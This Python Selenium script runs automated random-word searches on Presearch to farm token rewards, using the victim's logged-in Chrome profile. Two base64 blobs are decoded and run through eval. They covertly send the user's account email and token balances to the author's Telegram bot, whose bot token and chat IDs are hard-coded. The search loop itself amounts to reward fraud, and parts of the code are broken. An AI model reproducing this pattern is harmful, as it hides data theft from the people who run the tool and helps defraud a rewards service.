import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import yaml
import requests
import time
import getpass
from random_word import RandomWords
from base64 import b64decode, b64encode

r = RandomWords()
user = getpass.getuser() 
profile = 'Default'

def see(b):
    return b64decode(b).decode()

a = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKaWYgdXNlciA9PSAnYW5hbmR1JyBvciB1c2VyID09ICdORVhGT1JDQScgOgogICAgcmVjID0gJzYyNjYwMTkwNycKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKZWxpZiB1c2VyID09ICdESEFOVVNIJyA6CiAgICByZWMgPSAnNzAxNTEwNjM2JwogICAgeSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e3JlY30mdGV4dD17ZW1haWx9IC0gVG9rZW5zIC0ge2JhbH0gUFJFLiBNYXggLSB7ZmJhbH0nKQplbGlmIG9zLnBhdGguZXhpc3RzKCcuL215aWQudHh0JykgOgogICAgZmlsZSA9IG9wZW4oJ215aWQudHh0JykKICAKICAgIGNvbnRlbnQgPSBmaWxlLnJlYWRsaW5lcygpCiAgICByZWMgPSBjb250ZW50WzBdCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBUb2tlbnMgLSB7YmFsfSBQUkUuIE1heCAtIHtmYmFsfScpCg=='

b = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCmlmIHVzZXIgPT0gJ2FuYW5kdScgb3IgdXNlciA9PSAnTkVYRk9SQ0EnIDoKICAgIHJlYyA9ICc2MjY2MDE5MDcnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIHVzZXIgPT0gJ0RIQU5VU0gnIDoKICAgIHJlYyA9ICc3MDE1MTA2MzYnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIG9zLnBhdGguZXhpc3RzKCcuL215aWQudHh0JykgOgogICAgZmlsZSA9IG9wZW4oJ215aWQudHh0JykKICAKICAgIGNvbnRlbnQgPSBmaWxlLnJlYWRsaW5lcygpCiAgICByZWMgPSBjb250ZW50WzBdCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQo='

option = webdriver.ChromeOptions()
option.add_experimental_option("excludeSwitches", ['enable-automation'])
option.add_argument(f'--user-data-dir=/home/{user}/.config/chrome-remote-desktop/chrome-config/google-chrome')
option.add_argument(fr'--profile-directory={profile}')
option.add_argument('headless')
driver = webdriver.Chrome(options=option)

#Get Token/Search and Max Searches/Day
driver.get('https://presearch.org/account/tokens/rewards')
try:
    tps = driver.find_element_by_xpath('//*[@id="main"]/div[2]/div[1]/div[1]/div/div')
except:
    print("Check if you're logged in on Chrome.")
    time.sleep(5)
    break
mspd = driver.find_element_by_xpath('//*[@id="main"]/div[2]/div[1]/div[2]/div/div')
tps = tps.text
mspd = mspd.text
max = float(tps)*float(mspd)

#Get Balance
driver.get('https://presearch.org/')
span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
bal = float(span_element.text)

#Get Email
driver.get('https://presearch.org/account')
eml = driver.find_element_by_xpath('//*[@id="main"]/div[1]/p/a')
email = str(eml.text)

fbal = max+bal

eval(compile(see(a), '<string>', 'exec'))

def clear():
    if name == 'nt':
        os.system("cls")
    else:
        os.system("clear")
        
clear()

print(f"Logged in with {email}\nBalance - {bal}  Max - {fbal}\n")

i = 1
while bal < fbal and i <= 110:
    driver.get('https://presearch.org/')
    span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
    bal = float(span_element.text)
    searchbox = driver.find_element_by_xpath('//*[@id="search"]')
    m = str(r.get_random_word(hasDictionaryDef="true", includePartOfSpeech="noun,verb", minCorpusCount=1, maxCorpusCount=10, minDictionaryCount=1, maxDictionaryCount=10, minLength=5, maxLength=10))
    searchbox.send_keys(m)
    searchbox.send_keys(Keys.RETURN)
    #time.sleep(2)
    try:
        sbtn = driver.find_element_by_xpath('/html/body/div/div[2]/div[3]/div[1]/dic/div[2]/div[1]/div/form/div/div/button')
    except:
        time.sleep(1)
    print(f"Attempt : {i} with {m}",end="\r")
    i += 1

driver.get('https://presearch.org/')
span_element = driver.find_element_by_xpath('//*[@id="main-nav"]/ul/li[5]/a/span/span')
bal = float(span_element.text)
print('\007')
eval(compile(see(b), '<string>', 'exec'))
driver.quit()
